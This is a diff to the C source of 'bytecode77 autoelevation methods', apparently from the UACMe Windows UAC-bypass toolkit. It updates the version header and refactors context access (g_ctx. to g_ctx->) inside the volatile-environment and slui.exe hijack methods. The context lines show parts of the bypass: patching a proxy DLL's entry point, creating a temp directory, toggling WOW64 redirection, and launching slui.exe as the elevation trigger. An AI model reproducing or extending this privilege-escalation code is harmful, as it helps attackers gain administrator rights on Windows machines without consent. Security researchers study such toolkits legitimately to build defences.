@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2018
+*  (C) COPYRIGHT AUTHORS, 2017 - 2019
 *
 *  TITLE:       BYTECODE77.C
 *
-*  VERSION:     3.00
+*  VERSION:     3.15
 *
-*  DATE:        25 Aug 2018
+*  DATE:        15 Feb 2019
 *
 *  bytecode77 autoelevation methods.
 *
@@ -52,10 +52,11 @@ BOOL ucmVolatileEnvMethod(
         //
         // Replace default Fubuki dll entry point with new and remove dll flag.
         //
-        if (!supConvertDllToExeSetNewEP(
+        if (!supReplaceDllEntryPoint(
             ProxyDll,
             ProxyDllSize,
-            FUBUKI_DEFAULT_ENTRYPOINT))
+            FUBUKI_DEFAULT_ENTRYPOINT,
+            TRUE))
         {
             break;
         }
@@ -64,7 +65,7 @@ BOOL ucmVolatileEnvMethod(
         // Create %temp%\KureND directory.
         //
         RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
-        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
         _strcat(szBuffer, T_KUREND);
 
         if (!CreateDirectory(szBuffer, NULL))
@@ -135,7 +136,7 @@ BOOL ucmSluiHijackMethod(
 #endif
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
             return FALSE;
     }
@@ -162,7 +163,7 @@ BOOL ucmSluiHijackMethod(
         //
         cbData = (DWORD)((1 + sz) * sizeof(WCHAR));
 
-        switch (g_ctx.MethodExecuteType) {
+        switch (g_ctx->MethodExecuteType) {
         
         case ucmExTypeRegSymlink:
             
@@ -199,7 +200,7 @@ BOOL ucmSluiHijackMethod(
             //
             // Run trigger application.
             //
-            _strcpy(szBuffer, g_ctx.szSystemDirectory);
+            _strcpy(szBuffer, g_ctx->szSystemDirectory);
             _strcat(szBuffer, SLUI_EXE);
 
             RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
@@ -244,7 +245,7 @@ BOOL ucmSluiHijackMethod(
     }
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
     }
 #endif
